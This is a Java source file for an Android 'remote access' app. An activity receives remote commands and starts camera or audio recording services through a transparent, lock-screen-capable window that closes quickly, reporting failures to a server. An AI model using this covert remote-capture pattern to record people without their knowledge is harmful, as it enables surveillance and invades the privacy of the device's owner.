package com.droid.remoteaccess.activitys;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;

import androidx.core.content.ContextCompat;

import com.droid.remoteaccess.feature.Constantes;
import com.droid.remoteaccess.recorder.DroidAudioRecorder;
import com.droid.remoteaccess.recorder.DroidCameraCaptureService;
import com.droid.remoteaccess.services.BrokerMessageHandler;

public class RemoteMediaCommandActivity extends Activity {

    private static final String TAG = "RemoteMediaCommand";
    private static final long START_DELAY_MS = 250;
    private static final long FINISH_DELAY_MS = 1500;
    private static final String PREF_MEDIA_COMMAND_STARTED_PREFIX = "media_command_started_";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean commandStarted;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        prepareForegroundWindow();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (commandStarted) {
            return;
        }
        commandStarted = true;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                startMediaCommandService();
            }
        }, START_DELAY_MS);
    }

    private void prepareForegroundWindow() {
        Window window = getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                setShowWhenLocked(true);
                setTurnScreenOn(true);
            } else {
                window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
            }
        }
        setFinishOnTouchOutside(false);
    }

    private void startMediaCommandService() {
        Intent request = getIntent();
        String command = request.getStringExtra(Constantes.CHAMADAPORCOMANDOTEXTO);
        Class<?> serviceClass = getServiceClass(command);
        if (serviceClass == null) {
            sendLaunchError(command);
            finishSoon();
            return;
        }
        markMediaCommandStarted(this, request.getStringExtra(Constantes.COMMAND_ID));

        Intent serviceIntent = new Intent(getApplicationContext(), serviceClass);
        serviceIntent.putExtra(Constantes.CHAMADAPORCOMANDOTEXTO, command);
        serviceIntent.putExtra(Constantes.REPLY_TOKEN, request.getStringExtra(Constantes.REPLY_TOKEN));
        serviceIntent.putExtra(Constantes.ID_FROM, request.getStringExtra(Constantes.ID_FROM));
        serviceIntent.putExtra(Constantes.DEVICE_FROM, request.getStringExtra(Constantes.DEVICE_FROM));
        serviceIntent.putExtra(Constantes.COMMAND_ID, request.getStringExtra(Constantes.COMMAND_ID));

        try {
            if (serviceClass == DroidAudioRecorder.class && !requiresForegroundAudio(command)) {
                startService(serviceIntent);
            } else {
                ContextCompat.startForegroundService(this, serviceIntent);
            }
        } catch (Exception ex) {
            Log.e(TAG, "Failed to start media service: " + command, ex);
            sendLaunchError(command);
        }
        finishSoon();
    }

    private Class<?> getServiceClass(String command) {
        if (isCameraCommand(command)) {
            return DroidCameraCaptureService.class;
        }
        if (command != null && command.startsWith("a")) {
            return DroidAudioRecorder.class;
        }
        return null;
    }

    private boolean isCameraCommand(String command) {
        return command != null
                && (command.startsWith("v")
                || command.equalsIgnoreCase("pr")
                || command.equalsIgnoreCase("pf")
                || command.equalsIgnoreCase("pb"));
    }

    private boolean requiresForegroundAudio(String command) {
        return command != null
                && (command.equalsIgnoreCase("ar")
                || command.equalsIgnoreCase("ar5")
                || command.equalsIgnoreCase("ar10")
                || command.equalsIgnoreCase("ar15"));
    }

    private void sendLaunchError(String command) {
        Intent request = getIntent();
        BrokerMessageHandler.sendResponseToServer(this,
                request.getStringExtra(Constantes.REPLY_TOKEN),
                getLaunchErrorResponse(command),
                null,
                request.getStringExtra(Constantes.ID_FROM),
                request.getStringExtra(Constantes.DEVICE_FROM),
                request.getStringExtra(Constantes.COMMAND_ID));
    }

    private String getLaunchErrorResponse(String command) {
        if (command == null || command.isEmpty()) {
            return "r:error";
        }
        if (command.equalsIgnoreCase("pf") || command.equalsIgnoreCase("pb") || command.equalsIgnoreCase("pr")) {
            return "r:up:error";
        }
        if (command.startsWith("v")) {
            return "r:uv:error";
        }
        if (command.startsWith("a")) {
            return "r:ar:error";
        }
        return "r:" + command + ":error";
    }

    private void finishSoon() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, FINISH_DELAY_MS);
    }

    public static void clearMediaCommandStarted(Context context, String commandId) {
        if (context == null || commandId == null || commandId.isEmpty()) {
            return;
        }
        PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext())
                .edit()
                .remove(PREF_MEDIA_COMMAND_STARTED_PREFIX + commandId)
                .apply();
    }

    public static boolean hasMediaCommandStarted(Context context, String commandId) {
        if (context == null || commandId == null || commandId.isEmpty()) {
            return true;
        }
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        return preferences.getBoolean(PREF_MEDIA_COMMAND_STARTED_PREFIX + commandId, false);
    }

    private static void markMediaCommandStarted(Context context, String commandId) {
        if (context == null || commandId == null || commandId.isEmpty()) {
            return;
        }
        PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext())
                .edit()
                .putBoolean(PREF_MEDIA_COMMAND_STARTED_PREFIX + commandId, true)
                .apply();
    }
}
